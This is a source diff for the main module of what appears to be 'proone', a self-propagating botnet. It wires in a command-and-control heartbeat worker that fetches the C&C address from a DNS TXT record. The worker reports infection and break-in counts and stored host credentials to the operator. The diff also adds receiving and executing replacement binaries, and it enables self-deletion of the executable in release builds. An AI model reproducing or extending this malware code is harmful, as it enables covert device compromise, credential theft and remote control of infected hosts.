@@ -23,6 +23,7 @@
 #include "proone.h"
 #include "protocol.h"
 #include "util_rt.h"
+#include "endian.h"
 #include "dvault.h"
 #include "llist.h"
 #include "mbedtls.h"
@@ -33,9 +34,8 @@ struct prne_shared_global *prne_s_g = NULL;
 
 sigset_t ss_exit, ss_all;
 
-static prne_worker_t wkr_arr[2];
+static prne_worker_t wkr_arr[3];
 static size_t wkr_cnt;
-
 
 static void alloc_resolv (void) {
 	prne_resolv_ns_pool_t pool4, pool6;
@@ -87,8 +87,137 @@ END:
 	prne_resolv_free_ns_pool(&pool6);
 }
 
+static bool cb_htbt_cnc_txtrec (char *out) {
+	strcpy(out, prne_dvault_get_cstr(PRNE_DATA_KEY_CNC_TXT_REC, NULL));
+	prne_dvault_reset();
+	return true;
+}
+
+static bool cb_htbt_hostinfo (prne_htbt_host_info_t *out) {
+	const struct timespec ts_now = prne_gettime(CLOCK_MONOTONIC);
+
+	out->parent_uptime = prne_sub_timespec(ts_now, prne_g.parent_start).tv_sec;
+	out->child_uptime = prne_sub_timespec(ts_now, prne_g.child_start).tv_sec;
+	if (prne_s_g != NULL) {
+		out->bne_cnt = prne_s_g->bne_cnt;
+		out->infect_cnt = prne_s_g->infect_cnt;
+		if (prne_htbt_alloc_host_info(out, prne_s_g->host_cred_len)) {
+			memcpy(
+				out->host_cred,
+				prne_s_g->host_cred_data,
+				prne_s_g->host_cred_len);
+		}
+		out->crash_cnt = prne_s_g->crash_cnt;
+	}
+	out->parent_pid = prne_g.parent_pid;
+	out->child_pid = prne_g.child_pid;
+	memcpy(
+		out->prog_ver,
+		prne_dvault_get_bin(PRNE_DATA_KEY_PROG_VER, NULL),
+		prne_op_min(sizeof(out->prog_ver), 16));
+	prne_dvault_reset();
+	memcpy(
+		out->boot_id,
+		prne_g.boot_id,
+		prne_op_min(sizeof(out->boot_id), sizeof(prne_g.boot_id)));
+	memcpy(
+		out->instance_id,
+		prne_g.instance_id,
+		prne_op_min(sizeof(out->instance_id), sizeof(prne_g.instance_id)));
+	out->arch = prne_host_arch;
+
+	return true;
+}
+
+static char *cb_htbt_tmpfile (size_t req_size, const mode_t mode) {
+	uint8_t m[16];
+	char *path = prne_alloc_str(36 + 3), *ret = NULL;
+	int fd = -1;
+
+	path[0] = 0;
+	do {
+		if (path == NULL) {
+			break;
+		}
+		if (mbedtls_ctr_drbg_random(&prne_g.ssl.rnd, m, sizeof(m)) != 0) {
+			break;
+		}
+		path[0] = '.';
+		path[1] = '/';
+		path[2] = '.';
+		prne_uuid_tostr(m, path + 3);
+		path[39] = 0;
+
+		fd = open(path, O_RDWR | O_CREAT | O_TRUNC, mode);
+		if (fd < 0) {
+			break;
+		}
+		chmod(path, mode);
+		if (ftruncate(fd, req_size) != 0) {
+			break;
+		}
+
+		ret = path;
+		path = NULL;
+	} while (false);
+
+	if (path != NULL) {
+		if (fd >= 0) {
+			unlink(path);
+		}
+		prne_free(path);
+	}
+	prne_close(fd);
+	return ret;
+}
+
+static bool cb_htbt_nybin (const char *path, const prne_htbt_cmd_t *cmd) {
+	const size_t strsize = prne_nstrlen(path) + 1;
+
+	if (prne_s_g == NULL ||
+		strsize > sizeof(prne_s_g->ny_bin_path) ||
+		cmd->mem_len > sizeof(prne_s_g->ny_bin_args))
+	{
+		errno = ENOMEM;
+		return false;
+	}
+	memcpy(prne_s_g->ny_bin_path, path, strsize);
+	memcpy(prne_s_g->ny_bin_args, cmd->mem, cmd->mem_len);
+
+	pth_raise(prne_g.main_pth, SIGTERM);
+
+	return true;
+}
+
+
 static void alloc_htbt (void) {
-	// TODO
+	prne_htbt_param_t param;
+
+	prne_htbt_init_param(&param);
+
+	if (!(prne_g.c_ssl.ready && prne_g.s_ssl.ready)) {
+		goto END;
+	}
+
+	param.lbd_ssl_conf = &prne_g.s_ssl.conf;
+	param.main_ssl_conf = &prne_g.c_ssl.conf;
+	param.ctr_drbg = &prne_g.ssl.rnd;
+	param.resolv = prne_g.resolv;
+	param.cb_f.cnc_txtrec = cb_htbt_cnc_txtrec;
+	param.cb_f.hostinfo = cb_htbt_hostinfo;
+	param.cb_f.tmpfile = cb_htbt_tmpfile;
+	param.cb_f.ny_bin = cb_htbt_nybin;
+	param.blackhole = prne_g.blackhole[1];
+
+	prne_g.htbt = prne_alloc_htbt(
+		wkr_arr + wkr_cnt,
+		param);
+	if (prne_g.htbt != NULL) {
+		wkr_cnt += 1;
+	}
+
+END:
+	prne_htbt_free_param(&param);
 }
 
 static void alloc_workers (void) {
@@ -104,6 +233,7 @@ static void free_workers (void) {
 		prne_free_worker(wkr_arr + i);
 	}
 	prne_g.resolv = NULL;
+	prne_g.htbt = NULL;
 }
 
 static void seed_ssl_rnd (const bool use_bent) {
@@ -152,15 +282,12 @@ static int proone_main (void) {
 		prne_assert(wkr_arr[i].pth != NULL);
 	}
 
-	do {
+	while (true) {
 		prne_assert(pth_sigwait(&ss_all, &caught_sig) == 0);
-		switch (caught_sig) {
-		case SIGCHLD: // Not my child
-		case SIGINT: // Probably Ctrl + C. Wait for the parent to send SIGTERM.
-		case SIGPIPE:
-			continue;
+		if (sigismember(&ss_exit, caught_sig) && caught_sig != SIGINT) {
+			break;
 		}
-	} while (false);
+	}
 	sigprocmask(SIG_UNBLOCK, &ss_exit, NULL);
 
 	for (size_t i = 0; i < wkr_cnt; i += 1) {
@@ -178,8 +305,35 @@ static int proone_main (void) {
 	return 0;
 }
 
+static void close_blackhole (void) {
+	prne_close(prne_g.blackhole[0]);
+	prne_close(prne_g.blackhole[1]);
+	prne_g.blackhole[0] = -1;
+	prne_g.blackhole[1] = -1;
+}
+
+static void open_blackhole (void) {
+	close_blackhole();
+
+	do {
+		// try null device
+		prne_g.blackhole[1] = open("/dev/null", O_WRONLY);
+		if (prne_g.blackhole[1] >= 0) {
+			fcntl(prne_g.blackhole[1], F_SETFD, FD_CLOEXEC);
+			break;
+		}
+
+		// try pipe
+		if (pipe(prne_g.blackhole) == 0) {
+			prne_sck_fcntl(prne_g.blackhole[0]);
+			prne_sck_fcntl(prne_g.blackhole[1]);
+			break;
+		}
+	} while (false);
+}
+
 static void delete_myself (const char *arg0) {
-#if defined(PRNE_DEBUG)
+#if !defined(PRNE_DEBUG)
 	unlink(arg0);
 #endif
 }
@@ -274,7 +428,7 @@ static void init_proone (const char *self) {
 		(uint_fast16_t)prne_g.m_exec[prne_g.exec_size + 0] << 8 |
 		(uint_fast16_t)prne_g.m_exec[prne_g.exec_size + 1] << 0;
 
-	dvault_ofs = prne_salign_next(prne_g.exec_size, PRNE_BIN_ALIGNMENT) + 8;
+	dvault_ofs = prne_g.exec_size + 8;
 	binarch_ofs = dvault_ofs + prne_salign_next(
 		prne_g.dvault_size,
 		PRNE_BIN_ALIGNMENT);
@@ -286,12 +440,12 @@ static void init_proone (const char *self) {
 	setup_dvault();
 
 	if (binarch_size > 0) {
-		prne_g.bin_ready = prne_index_bin_archive(
+		prne_index_bin_archive(
 			prne_g.m_exec + binarch_ofs,
 			binarch_size,
-			&prne_g.bin_archive) == PRNE_PACK_RC_OK;
+			&prne_g.bin_archive);
 	}
-	if (!prne_g.bin_ready) {
+	if (prne_g.bin_archive.nb_bin == 0) {
 		prne_dbgpf("* This executable has no binary archive!\n");
 	}
 #undef ELF_EHDR_TYPE
@@ -618,6 +772,7 @@ static bool init_shared_global (void) {
 		prne_dbgperr("* Failed to initialise shared global");
 	}
 	else {
+		// Session init code goes here
 		prne_s_g->ny_bin_path[0] = 0;
 	}
 
@@ -641,15 +796,11 @@ static void init_ids (void) {
 	char line[37];
 	int fd = -1;
 
-	if (mbedtls_ctr_drbg_random(
+	mbedtls_ctr_drbg_random(
 		&prne_g.ssl.rnd,
 		prne_g.instance_id,
-		sizeof(prne_g.instance_id)) != 0)
-	{
-		prne_memzero(prne_g.instance_id, sizeof(prne_g.instance_id));
-	}
+		sizeof(prne_g.instance_id));
 
-	prne_memzero(prne_g.boot_id, 16);
 	do { // fake loop
 		fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
 		if (fd < 0) {
@@ -673,7 +824,6 @@ static void set_host_credential (const char *str) {
 		return;
 	}
 
-	// TODO: test
 	mbedtls_base64_decode(
 		prne_s_g->host_cred_data,
 		sizeof(prne_s_g->host_cred_data),
@@ -682,7 +832,94 @@ static void set_host_credential (const char *str) {
 		strlen(str));
 }
 
-static void run_ny_bin (void) {
+static char *do_recombination (const uint8_t *m_nybin, const size_t nybin_len) {
+	uint8_t buf[4096];
+	char *exec = NULL, *ret = NULL;
+	const char *path;
+	prne_bin_archive_t ba;
+	prne_bin_rcb_ctx_t rcb;
+	const uint8_t *m_dv, *m_ba;
+	size_t dv_len, ba_len;
+	prne_pack_rc_t prc;
+	int fd = -1;
+	ssize_t f_ret;
+	size_t path_len;
+
+	prne_init_bin_archive(&ba);
+	prne_init_bin_rcb_ctx(&rcb);
+
+	if (nybin_len < 8) {
+		goto END;
+	}
+	dv_len = prne_recmb_msb16(m_nybin[0], m_nybin[1]);
+	if (8 + dv_len > nybin_len) {
+		goto END;
+	}
+	m_dv = m_nybin + 8;
+	m_ba = m_nybin + 8 + prne_salign_next(dv_len, PRNE_BIN_ALIGNMENT);
+	ba_len = nybin_len - (m_ba - m_nybin);
+
+	prc = prne_index_bin_archive(m_ba, ba_len, &ba);
+	if (prc != PRNE_PACK_RC_OK) {
+		goto END;
+	}
+	prc = prne_start_bin_rcb(
+		&rcb,
+		prne_host_arch,
+		PRNE_ARCH_NONE,
+		NULL,
+		0,
+		0,
+		m_dv,
+		dv_len,
+		&ba);
+	if (prc != PRNE_PACK_RC_OK) {
+		goto END;
+	}
+
+	path = prne_dvault_get_cstr(PRNE_DATA_KEY_EXEC_NAME, &path_len);
+	exec = prne_alloc_str(path_len);
+	if (exec == NULL) {
+		goto END;
+	}
+	strcpy(exec, path);
+	prne_dvault_reset();
+	fd = open(
+		exec,
+		O_WRONLY | O_CREAT | O_TRUNC,
+		0700);
+	if (fd < 0) {
+		goto END;
+	}
+	chmod(exec, 0700);
+
+	do {
+		f_ret = prne_bin_rcb_read(&rcb, buf, sizeof(buf), &prc, NULL);
+		if (f_ret < 0) {
+			goto END;
+		}
+		if (f_ret > 0 && write(fd, buf, f_ret) != f_ret) {
+			goto END;
+		}
+	} while (prc != PRNE_PACK_RC_EOF);
+
+	ret = exec;
+	exec = NULL;
+
+END:
+	prne_dvault_reset();
+	if (exec != NULL && fd > 0) {
+		unlink(exec);
+	}
+	prne_free(exec);
+	prne_free_bin_archive(&ba);
+	prne_free_bin_rcb_ctx(&rcb);
+	prne_close(fd);
+
+	return ret;
+}
+
+static void do_exec (const char *exec, char **args) {
 	sigset_t old_ss;
 	bool has_ss;
 
@@ -691,7 +928,8 @@ static void run_ny_bin (void) {
 	deinit_shared_global();
 	has_ss = sigprocmask(SIG_UNBLOCK, &ss_all, &old_ss) == 0;
 
-	// TODO
+	execv(exec, args);
+	prne_dbgperr("** exec()");
 
 	// exec() failed
 	// Restore previous condifion
@@ -701,10 +939,81 @@ static void run_ny_bin (void) {
 	init_shared_global();
 }
 
+static void run_ny_bin (void) {
+	const uint8_t *m_nybin = NULL;
+	size_t nybin_len = 0;
+	off_t ofs;
+	int fd = -1;
+	char **args = NULL;
+	char *add_args[1] = { NULL };
+
+	fd = open(prne_s_g->ny_bin_path, O_RDONLY);
+	unlink(prne_s_g->ny_bin_path);
+	prne_s_g->ny_bin_path[0] = 0;
+	if (fd < 0) {
+		goto END;
+	}
+	ofs = lseek(fd, 0, SEEK_END);
+	if (ofs < 0) {
+		goto END;
+	}
+	nybin_len = (size_t)ofs;
+
+	m_nybin = (const uint8_t*)mmap(
+		NULL,
+		nybin_len,
+		PROT_READ,
+		MAP_SHARED,
+		fd,
+		0);
+	close(fd);
+	fd = -1;
+	if (m_nybin == MAP_FAILED) {
+		m_nybin = NULL;
+		goto END;
+	}
+	add_args[0] = do_recombination(m_nybin, nybin_len);
+	if (add_args[0] == NULL) {
+		goto END;
+	}
+
+	add_args[0] = add_args[0];
+	args = prne_htbt_parse_args(
+		prne_s_g->ny_bin_args,
+		sizeof(prne_s_g->ny_bin_args),
+		1,
+		add_args,
+		NULL,
+		SIZE_MAX);
+	if (args == NULL) {
+		goto END;
+	}
+	do_exec(args[0], args);
+
+END:
+	prne_close(fd);
+	if (m_nybin != NULL) {
+		munmap((void*)m_nybin, nybin_len);
+	}
+	if (add_args[0] != NULL) {
+		unlink(add_args[0]);
+		prne_free(add_args[0]);
+	}
+	prne_free(args);
+}
+
 
 int main (const int argc, const char **args) {
 	static int exit_code;
 	static bool loop = true;
+
+	// done with the terminal
+	close(STDIN_FILENO);
+#ifndef PRNE_DEBUG
+	// Some stupid library can use these
+	close(STDOUT_FILENO);
+	close(STDERR_FILENO);
+#endif
 
 	sigemptyset(&ss_exit);
 	sigemptyset(&ss_all);
@@ -716,12 +1025,10 @@ int main (const int argc, const char **args) {
 	sigaddset(&ss_all, SIGPIPE);
 
 	prne_g.parent_start = prne_gettime(CLOCK_MONOTONIC);
-	prne_g.resolv = NULL;
 	prne_g.parent_pid = getpid();
-	prne_g.child_pid = 0;
+	prne_g.blackhole[0] = -1;
+	prne_g.blackhole[1] = -1;
 	prne_g.shm_fd = -1;
-	prne_g.bin_ready = false;
-	prne_g.is_child = false;
 	prne_init_bin_archive(&prne_g.bin_archive);
 	mbedtls_x509_crt_init(&prne_g.ssl.ca);
 	prne_mbedtls_entropy_init(&prne_g.ssl.entpy);
@@ -730,12 +1037,11 @@ int main (const int argc, const char **args) {
 	mbedtls_x509_crt_init(&prne_g.s_ssl.crt);
 	mbedtls_pk_init(&prne_g.s_ssl.pk);
 	mbedtls_dhm_init(&prne_g.s_ssl.dhm);
-	prne_g.s_ssl.ready = false;
 	mbedtls_ssl_config_init(&prne_g.c_ssl.conf);
 	mbedtls_x509_crt_init(&prne_g.c_ssl.crt);
 	mbedtls_pk_init(&prne_g.c_ssl.pk);
-	prne_g.c_ssl.ready = false;
 
+	open_blackhole();
 	init_proone(args[0]);
 
 	/* inits that need outside resources. IN THIS ORDER! */
@@ -750,22 +1056,11 @@ int main (const int argc, const char **args) {
 	delete_myself(args[0]);
 	disasble_watchdog();
 
-
-	// load data from stdin
 	if (argc > 1) {
 		set_host_credential(args[1]);
 	}
 
-	// done with the terminal
-	close(STDIN_FILENO);
-#ifndef PRNE_DEBUG
-	// Some stupid library can use these
-	close(STDOUT_FILENO);
-	close(STDERR_FILENO);
-#endif
-
 	sigprocmask(SIG_BLOCK, &ss_all, NULL);
-
 	// main loop
 	while (loop) {
 		prne_g.child_pid = fork();
@@ -812,9 +1107,10 @@ int main (const int argc, const char **args) {
 						prne_dbgpf("* Detected new bin. Attempting to exec()\n");
 						run_ny_bin();
 						// run_ny_bin() returns if fails
-						prne_dbgperr("** run_ny_bin() failed");
 					}
-					break;
+					else {
+						break;
+					}
 				}
 			}
 			else if (WIFSIGNALED(status)) {
@@ -823,7 +1119,7 @@ int main (const int argc, const char **args) {
 
 			if (has_ny_bin) {
 				unlink(prne_s_g->ny_bin_path);
-				prne_memzero(prne_s_g->ny_bin_path, sizeof(prne_s_g->ny_bin_path));
+				prne_s_g->ny_bin_path[0] = 0;
 			}
 
 			sleep(1);
@@ -833,6 +1129,7 @@ int main (const int argc, const char **args) {
 			prne_g.shm_fd = -1;
 			prne_g.is_child = true;
 			prne_g.child_start = prne_gettime(CLOCK_MONOTONIC);
+			prne_g.child_pid = getpid();
 
 			exit_code = proone_main();
 			break;
@@ -842,23 +1139,21 @@ int main (const int argc, const char **args) {
 
 END:
 	prne_free_bin_archive(&prne_g.bin_archive);
-	prne_g.bin_ready = false;
 
 	mbedtls_ssl_config_free(&prne_g.s_ssl.conf);
 	mbedtls_x509_crt_free(&prne_g.s_ssl.crt);
 	mbedtls_pk_free(&prne_g.s_ssl.pk);
 	mbedtls_dhm_free(&prne_g.s_ssl.dhm);
-	prne_g.s_ssl.ready = false;
 	mbedtls_ssl_config_free(&prne_g.c_ssl.conf);
 	mbedtls_x509_crt_free(&prne_g.c_ssl.crt);
 	mbedtls_pk_free(&prne_g.c_ssl.pk);
-	prne_g.c_ssl.ready = false;
 	mbedtls_x509_crt_free(&prne_g.ssl.ca);
 	mbedtls_ctr_drbg_free(&prne_g.ssl.rnd);
 	mbedtls_entropy_free(&prne_g.ssl.entpy);
 
 	deinit_shared_global();
 	deinit_proone();
+	close_blackhole();
 
 	return exit_code;
 }
